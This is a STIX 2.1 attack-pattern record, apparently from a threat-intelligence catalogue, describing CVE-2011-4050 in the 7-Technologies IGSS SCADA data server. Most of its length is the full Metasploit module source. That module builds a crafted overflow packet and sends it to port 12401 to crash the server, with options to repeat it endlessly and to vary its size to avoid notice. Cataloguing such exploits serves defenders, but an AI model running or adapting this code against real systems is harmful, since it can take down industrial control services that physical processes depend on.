{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c15615e-efb5-49f4-8a43-bffe40e3f58c",
    "created": "2024-08-14T16:24:45.208956Z",
    "modified": "2024-08-14T16:24:45.208961Z",
    "name": "7-Technologies IGSS 9 IGSSdataServer.exe DoS",
    "description": " The 7-Technologies SCADA IGSS Data Server (IGSSdataServer.exe) <= 9.0.0.10306 can be brought down by sending a crafted TCP packet to port 12401.  This should also work for version <= 9.0.0.1120, but that version hasn't been tested. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/scada/igss9_dataserver.rb",
            "external_id": "igss9_dataserver.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-4050"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-11-335-01"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => '7-Technologies IGSS 9 IGSSdataServer.exe DoS',\n      'Description'    => %q{\n        The 7-Technologies SCADA IGSS Data Server (IGSSdataServer.exe) <= 9.0.0.10306 can be\n        brought down by sending a crafted TCP packet to port 12401.  This should also work\n        for version <= 9.0.0.1120, but that version hasn't been tested.\n      },\n      'Author'          =>\n        [\n          'jfa', # Metasploit module\n        ],\n      'License'         => MSF_LICENSE,\n      'References'      =>\n        [\n          [ 'CVE', '2011-4050' ],\n          [ 'OSVDB', '77976' ],\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-11-335-01' ]\n        ],\n      'DisclosureDate' => '2011-12-20'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(12401),\n        OptInt.new('COUNT', [ true, \"DoS IGSSdataServer.exe this many times. 0 for infinite loop.\", 1]),\n        OptInt.new('SLEEP', [ true, 'Number of seconds to sleep between sending DoS packet.', 3])\n      ])\n  end\n\n  def run\n    #\n    #dos = \"\\x00\\x04\\x01\\x00\\x34\\x12\\x0D\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"\n    #dos << Rex::Text.rand_text_alpha(5014)\n    #\n    # I should have looked at the other MSF modules before I started doing it the hard way.\n    # Lesson learn, thanks hal. Mostly borrowed from igss9_igssdataserver_rename\n    #\n\n    count = datastore['COUNT']\n    snore = datastore['SLEEP']\n    times = 1\n\n    # Someone wants to keep a good service down.\n    if count == 0\n      count = 1\n      infinite = true\n    end\n\n    #\n    # The port seems to stay open open until someone clicks \"Close the program\".\n    # Once they click \"Close the program\" (Windows 7), the port becomes unavailable.\n    #\n    # However, even though it's open, it doesn't seem to handle any valid requests.\n    #\n    while count >= 1 do\n      ## Randomize the buffer size to make it a teeny tiny bit less obvious\n      size = Random.new.rand(1024..5014)\n\n      dos  = \"\\x00\\x04\"           #Funky size causes overflow\n      dos << \"\\x01\\x00\\x34\\x12\"\n      dos << \"\\x0D\"               #Opcode\n      dos << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      dos << \"\\x01\"               #Flag\n      dos << \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"\n      dos << Rex::Text.rand_text_alpha(size)\n\n      begin\n        connect\n        sock.put(dos)\n        print_status(\"Sending DoS packet #{times}, size: #{dos.length} ...\")\n        disconnect\n      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED\n        print_status(\"Connection refused. Someone may have clicked 'Close the program'\")\n      end\n\n      if infinite\n        select(nil, nil, nil, snore)\n        times += 1\n      else\n        select(nil, nil, nil, snore) if count > 1\n        count -= 1\n        times += 1\n      end\n\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-12-20"
}